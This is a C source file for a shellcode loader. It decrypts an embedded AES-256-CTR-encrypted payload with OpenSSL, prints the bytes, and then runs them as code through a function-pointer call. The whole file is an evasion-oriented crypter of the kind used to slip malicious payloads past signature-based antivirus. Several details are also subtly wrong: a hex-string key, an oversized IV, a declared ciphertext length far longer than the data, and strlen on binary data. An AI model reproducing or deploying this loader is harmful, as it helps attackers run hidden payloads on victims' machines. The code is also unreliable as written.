#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

void print_shellcode(unsigned char *shellcode) {
    size_t len = strlen(shellcode);
    int i;

    for (i = 0; i < len; i++) {
        printf("\\x%02x", *(shellcode + i));
    }

    printf("\n\n");
}

int main(int argc, char *argv[]) {
    // 256 bit key
    unsigned char *key = "424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb47be5f7d424b1e9083e83b822ac7dbeb47be5f7";

    // 128 bit IV
    unsigned char *iv = "01123481321345514";

    // Encrypted shellcode
    unsigned char *encrypted_shellcode =
       					"\xd1\x9d\x6f\x0f\x07\x68\xb8\x3a\x51\x72\x21\x30\x6a\x16\xe7\x2d"
								"\xc2\x39\x91\x45\x58\xdd\x54\xf6\xc1\x75\xb4\x1c\x59\x0a\xb4\xac"
								"\xff\x24\x3f\xb1\xfc\xfe\xd3\xe5\xd4\x55\xbb\x55\x4c\xcc\xf5\xeb"
								"\xac\x93\xe6\x5d\xe6\xf1\xfa\x1a\x1d\x6a\xf5\x9d\xcf\x45\x77\x2a"
								"\x6e\xd8\x0e\x19\x88\xf0\x52\x9c\xe8\x29\xa9\xcd\xe1\xdd\x9f\x96"
								"\xd1\xd0\xdc\x99\x70\x96\x44\x4f\xd8";

    // Buffer for the decrypted text
    unsigned char decrypted_shellcode[712];

    int decrypted_len;

    // Initialize the library
    ERR_load_crypto_strings();
    OpenSSL_add_all_algorithms();
    OPENSSL_config(NULL);

    // Decrypt the ciphertext
    decrypted_len = decrypt(encrypted_shellcode, 712, key, iv,
                            decrypted_shellcode);

    decrypted_shellcode[decrypted_len] = '\0';

    printf("Decrypted text is:\n");
    print_shellcode(decrypted_shellcode);

    // Execute decrypted shellcode
    printf("Executing shellcode...\n");
    printf("Shellcode Length:  %d\n", strlen(decrypted_shellcode));
    int (*ret)() = (int(*)())decrypted_shellcode;
    ret();

    // Cleanup
    EVP_cleanup();
    ERR_free_strings();

    return 0;
}

void handleErrors(void) {
    ERR_print_errors_fp(stderr);
    abort();
}

int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,
    unsigned char *iv, unsigned char *plaintext) {
    EVP_CIPHER_CTX *ctx;
    int len;
    int plaintext_len;

    // Create context
    if (! (ctx = EVP_CIPHER_CTX_new())) {
        handleErrors();
    }

    // Initialize decryption
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_ctr(), NULL, key, iv) != 1) {
        handleErrors();
    }

    // Decrypt the message
    if (EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len) != 1) {
        handleErrors();
    }

    plaintext_len = len;

    // Finalize decryption
    if (EVP_DecryptFinal_ex(ctx, plaintext + len, &len) != 1) {
        handleErrors();
    }

    plaintext_len += len;

    // Cleanup
    EVP_CIPHER_CTX_free(ctx);

    return plaintext_len;
}
